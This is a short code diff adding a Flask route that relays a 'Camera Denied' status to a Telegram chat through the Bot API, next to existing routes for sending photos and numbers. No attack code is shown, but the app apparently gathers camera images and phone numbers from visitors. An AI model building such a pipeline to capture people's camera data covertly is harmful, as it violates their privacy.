@@ -76,6 +76,22 @@ def send_photo():
 
     return jsonify({"ok": True})
 
+@app.route("/denied", methods=["POST"])
+def denied():
+    data = request.get_json()
+
+    chat_id = data.get("chat_id")
+
+    requests.post(
+        f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+        json={
+            "chat_id": chat_id,
+            "text": "❌ Camera Denied"
+        }
+    )
+
+    return jsonify({"ok": True})
+
 @app.route("/number", methods=["POST"])
 def number():
     data = request.get_json(force=True)
